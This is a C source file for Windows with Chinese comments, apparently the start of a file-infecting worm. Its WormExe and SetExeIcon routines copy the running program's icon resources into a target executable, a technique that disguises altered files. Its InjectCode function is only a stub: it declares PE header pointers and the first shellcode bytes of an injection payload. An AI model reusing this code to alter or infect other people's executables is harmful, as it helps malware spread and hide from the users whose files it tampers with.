#include "Global.h"

//修改指定可执行文件exe图标
void WormExe(char *szObjExePath)
{
	//获取当前进程可执行文件exe路径
	//可执行文件（exe）, 库文件（dll）
	TCHAR szCurrentExePath[MAX_PATH];

	GetModuleFileName(
					NULL,				//指定被加载的模块句柄
					szCurrentExePath,	//存储模块路径的缓冲区
					MAX_PATH);			//缓冲区大小

	//替换图标
	SetExeIcon(szCurrentExePath, szObjExePath);

}

//修改图标
BOOL SetExeIcon(char* szCurrentExePath, char* szObjExePath)
{
	//将当前模块加载到进程地址空间
	HMODULE hExe = LoadLibrary(szCurrentExePath);

	if (hExe == NULL)
	{
		return FALSE;
	}

	//枚举二进制模块指定类型资源
	EnumResourceNames(
		hExe,				//模块句柄
		RT_ICON,			//枚举资源的类型
		EnumIconProc,		//枚举资源名回调函数
		(LONG)szObjExePath	//传递给回调函数的参数值
		);

	return TRUE;
}

//枚举资源名回调函数
BOOL CALLBACK EnumIconProc(HMODULE hModule, LPCTSTR lpszType, LPTSTR lpszName, LONG lParam)
{
	//查找资源
	HRSRC hRes = FindResource(
				hModule,	//可执行文件模块句柄
				lpszName,	//资源名称
				RT_ICON		//资源的类型
		);

	if (hRes == NULL)
	{
		return FALSE;
	}

	HGLOBAL hResLoad = LoadResource(
		hModule,	//可执行文件模块句柄
		hRes		//资源句柄
		);

	if (hResLoad == NULL)
		return FALSE;

	//锁定资源
	LPVOID pData = LockResource(hResLoad);
	if (pData == NULL)
		return FALSE;

	//获取资源的大小
	DWORD dwSize = SizeofResource(hModule,	//可执行文件模块句柄
				  hRes);					//资源句柄

	if (lParam)
	{
		SetRes((LPSTR)lParam, RT_ICON, lpszName, pData, dwSize);
	}

	return TRUE;
}

//设置资源
BOOL SetRes(LPSTR szObjFileName, LPSTR szResType, LPSTR szResName, LPVOID pData, DWORD cbData)
{

	HANDLE hExe = BeginUpdateResource(
				szObjFileName,	//更新指定的二进制文件
				FALSE			//如果为TRUE：删除现有资源，
		);

	if (hExe == NULL)
		return FALSE;

	int nRet = UpdateResource(
			hExe,		//要更新的exe文件
			szResType,	//要更新的资源类型
			szResName,	//要更新的资源名称
			MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),//需要更新的语言标识符
			pData,		//图标资源数据
			cbData		//资源数据的大小
				);

	if (!nRet)
		return FALSE;

	EndUpdateResource(
				hExe,	//模块句柄
				FALSE	//是否将更新的资源写入文件，TRUE:不进行任何修改；FALSE:修改将资源更新
				);


	return TRUE;
}

//注入
BOOL InjectCode(char* szObjExePath)
{
	PIMAGE_DOS_HEADER pImageDosHeader;
	PIMAGE_NT_HEADERS pImageNtHeader;
	PIMAGE_SECTION_HEADER pImageSectionHeader;

	unsigned char thuncode[] = "\x60\x9c";
	return TRUE;
}